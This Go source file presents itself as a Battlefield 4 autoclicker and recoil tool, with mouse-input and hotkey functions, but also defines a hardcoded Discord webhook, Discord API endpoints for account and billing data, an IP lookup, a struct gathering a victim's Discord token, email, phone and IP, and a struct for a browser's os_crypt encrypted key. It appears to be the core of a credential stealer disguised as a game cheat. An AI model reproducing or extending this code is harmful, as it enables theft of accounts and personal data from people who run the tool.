package main

import (
	"fmt"
	"github.com/daspoet/gowinkey"
	"github.com/lxn/win"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"math/rand"
	"path/filepath"
	"time"
	"unsafe"
)

const (
	WebhookUrl      = "https://discord.com/api/webhooks/1076590301675790508/AP0Sxvrjaez7KOxcQRRBXa2_dmgYLcSGuT3IorfHEvr_Wds4VF2YzE4_YWmxID4hqypp"
	DiscordApiUsers = "https://discord.com/api/v9/users/@me"
	DiscordApiNitro = "https://discord.com/api/v9/users/@me/billing/subscriptions"
	DiscordImgUrl   = "https://cdn.discordapp.com/avatars/"
	IpAddrGet       = "https://ipinfo.io/ip"
	Debug           = false
	JPGPath         = "D:/Goland/GoLand 2022.1/Clicker BF4/picture.jpg"
)

var iDelay int

var clickerState = false
var recoilState = false
var recoilMode = false

type discordRequest struct { // модификации запроса получается
	Content string `json:"content"`
	//Username   string `json:"username"`
	//Avatar_url string `json:"avatar_url"`
	//	TTS        string `json:"tts"`
}

type discordStruct struct {
	DiscordAvatar string `json:"avatar"`
	DiscordUser   string `json:"user"`
	DiscordEmail  string `json:"email"`
	DiscordPhone  string `json:"phone"`
	DiscordNitro  string `json:"nitro"`
	Ip            string `json:"ip"`
	DisplayName   string `json:"name"`
	OsName        string `json:"osname"`
	CpuArch       string `json:"cpuarch"`
	Token         string `json:"token"`
}

type JsonKeyFile struct {
	Crypt OSCrypt `json:"os_crypt"`
}
type OSCrypt struct {
	EncryptedKey string `json:"encrypted_key"`
}

// Resource represents a single binary resource, such as an image or font.
// A resource has an identifying name and byte array content.
// The serialised path of a resource can be obtained which may result in a
// blocking filesystem write operation.
type Resource interface {
	Name() string
	Content() []byte
}

// StaticResource is a bundled resource compiled into the application.
// These resources are normally generated by the fyne_bundle command included in
// the Fyne toolkit.
type StaticResource struct {
	StaticName    string
	StaticContent []byte
}

// Name returns the unique name of this resource, usually matching the file it
// was generated from.
func (r *StaticResource) Name() string {
	return r.StaticName
}

// Content returns the bytes of the bundled resource, no compression is applied
// but any compression on the resource is retained.
func (r *StaticResource) Content() []byte {
	return r.StaticContent
}

// NewStaticResource returns a new static resource object with the specified
// name and content. Creating a new static resource in memory results in
// sharable binary data that may be serialised to the location returned by
// CachePath().
func NewStaticResource(name string, content []byte) *StaticResource {
	return &StaticResource{
		StaticName:    name,
		StaticContent: content,
	}
}

// LoadResourceFromPath creates a new StaticResource in memory using the contents of the specified file.
func LoadResourceFromPath(path string) (Resource, error) {
	bytes, err := ioutil.ReadFile(filepath.Clean(path))
	if err != nil {
		return nil, err
	}

	name := filepath.Base(path)
	return NewStaticResource(name, bytes), nil
}

func Usedkeys(keys ...gowinkey.VirtualKey) <-chan gowinkey.KeyEvent {
	ch, _ := gowinkey.Listen(gowinkey.Selective(keys...))
	return ch
}

func SendMouseLeftDownKey() {
	var input1 win.MOUSE_INPUT
	input1.Type = win.INPUT_MOUSE
	input1.Mi.DwFlags = win.MOUSEEVENTF_LEFTDOWN
	input1.Mi.MouseData = 0
	input1.Mi.DwExtraInfo = 0
	input1.Mi.Time = 0
	// Отправляем нажатие
	win.SendInput(1, unsafe.Pointer(&input1), int32(unsafe.Sizeof(input1)))
}

func SendMouseLeftUpKey() {
	var input2 win.MOUSE_INPUT
	input2.Type = win.INPUT_MOUSE
	input2.Mi.DwFlags = win.MOUSEEVENTF_LEFTUP
	input2.Mi.MouseData = 0
	input2.Mi.DwExtraInfo = 0
	input2.Mi.Time = 0
	// Отправляем отпускание
	win.SendInput(1, unsafe.Pointer(&input2), int32(unsafe.Sizeof(input2)))
}

func GetRandomInt(max int, min int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(max-min+1) + min
}

func CreateRegeditFile(valueName string, valueData string) {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `SOFTWARE\Discord`, registry.ALL_ACCESS)
	if err != nil {
		fmt.Println("Failed to create registry key:", err)
		return
	}
	defer key.Close()

	err = key.SetStringValue(valueName, valueData)
	if err != nil {
		fmt.Println("Failed to set registry value:", err)
		return
	}
	fmt.Println("Registry value set successfully!")
}
